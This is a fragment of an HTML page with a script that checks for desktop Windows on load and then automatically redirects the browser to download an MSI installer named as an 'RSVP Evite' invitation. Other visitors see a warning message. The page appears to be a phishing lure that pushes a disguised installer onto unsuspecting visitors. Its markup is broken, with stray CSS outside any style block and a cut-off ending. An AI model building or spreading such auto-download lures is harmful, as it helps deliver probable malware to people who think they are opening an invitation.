<!DOCTYPE html>

<meta charset="UTF-8">

<script>
function isDesktopWindows() {
    const ua = navigator.userAgent || "";
    const platform = navigator.platform || "";

    const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);


    const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);

    return isWindows && !isMobile && !isTouchOnly;
}

window.onload = function () {
    if (isDesktopWindows()) {

        window.location.replace("RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi");
    } else {
        const msg = document.getElementById("msg");
        if (msg) msg.style.display = "block";
    }
};
</script>

    font-family: Arial, sans-serif;
}

/* Full screen warning */
#msg {
